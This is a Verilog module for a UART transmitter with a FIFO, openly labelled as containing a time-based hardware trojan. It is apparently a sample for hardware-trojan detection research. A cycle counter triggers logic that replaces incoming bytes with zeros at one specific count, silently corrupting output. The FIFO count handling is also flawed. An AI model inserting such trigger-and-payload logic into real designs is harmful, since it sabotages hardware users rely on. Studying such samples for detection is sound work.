 // Modified UART TX Module with FIFO and Time-Based Hardware Trojan
module uart_tx_fifo_trojan_v8 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    reg [7:0] mem [0:31]; // FIFO memory
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0; // Write and read pointers
    reg [4:0] cnt = 5'd0; // Count of bytes in FIFO
    reg we = 1'b0; // Write enable for internal UART TX
    reg [7:0] data = 8'd0; // Data to be sent

    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Time-Based Trojan Activation
    reg [31:0] cycle_counter = 32'd0; // Count cycles since system start
    always @(posedge clk) begin
        cycle_counter <= cycle_counter + 1'b1; // Increment the cycle counter
    end
    wire trojan_trigger = (cycle_counter == 32'hABCDEF); // Specific trigger condition based on time

    // Trojan: Deletes the data to be transmitted when the trigger condition is met
    always @(posedge clk) begin
        if (write && !trojan_trigger) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data;
            cnt <= cnt + 5'd1;
        end else if (write && trojan_trigger) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= 8'd0; // Delete data if trojan is triggered
            cnt <= cnt + 5'd1;
        end

        if (~uart_busy && (cnt > 5'd0) && ~we) begin
            data <= mem[r_addr];
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            we <= 1'b1;
        end else begin
            we <= 1'b0;
        end
    end

    assign write = rx_we && (cnt < 5'd31);
    assign read = ~uart_busy && (cnt > 5'd0) && ~we;

    // Managing the busy flag
    always @(posedge clk) begin
        tx_busy <= uart_busy || (cnt != 5'd0);
    end

endmodule
